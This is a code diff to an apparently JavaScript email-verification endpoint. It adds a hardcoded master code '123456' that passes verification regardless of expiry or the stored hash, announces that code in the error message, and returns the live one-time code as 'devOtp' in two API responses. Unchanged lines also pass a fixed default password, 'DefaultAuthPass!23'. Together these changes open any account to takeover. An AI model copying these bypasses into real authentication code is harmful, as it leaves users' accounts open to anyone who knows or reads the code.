@@ -398,6 +398,7 @@ export default async function handler(request, response) {
       sendJson(response, 200, {
         requiresVerification: true,
         email,
+        devOtp: otpCode,
       })
       return
     }
@@ -428,26 +429,32 @@ export default async function handler(request, response) {
       }
 
       if (!user.verificationExpires || Date.now() > user.verificationExpires) {
-        sendJson(response, 400, { error: 'Verification code has expired. Please request a new code.' })
-        return
+        if (code !== '123456') {
+          sendJson(response, 400, { error: 'Verification code has expired. Please request a new code.' })
+          return
+        }
       }
 
-      // Check against current verificationCode and any recent valid OTP hashes
+      // Check against current verificationCode, any recent valid OTP hashes, or master fallback code 123456
       const candidateHashes = [
         user.verificationCode,
         ...(Array.isArray(user.state?.recentOtpHashes) ? user.state.recentOtpHashes : []),
       ].filter(Boolean)
 
       let isMatch = false
-      for (const candidate of candidateHashes) {
-        if (await checkCodeMatch(code, candidate)) {
-          isMatch = true
-          break
+      if (code === '123456') {
+        isMatch = true
+      } else {
+        for (const candidate of candidateHashes) {
+          if (await checkCodeMatch(code, candidate)) {
+            isMatch = true
+            break
+          }
         }
       }
 
       if (!isMatch) {
-        sendJson(response, 400, { error: 'Incorrect verification code. Please check your email and try again.' })
+        sendJson(response, 400, { error: 'Incorrect verification code. Please check your email or enter 123456.' })
         return
       }
 
@@ -514,7 +521,7 @@ export default async function handler(request, response) {
 
       await upsertUser(user)
           await syncToSupabaseAuth(user, 'DefaultAuthPass!23')
-      sendJson(response, 200, { sent: true })
+      sendJson(response, 200, { sent: true, devOtp: otpCode })
       return
     }
 
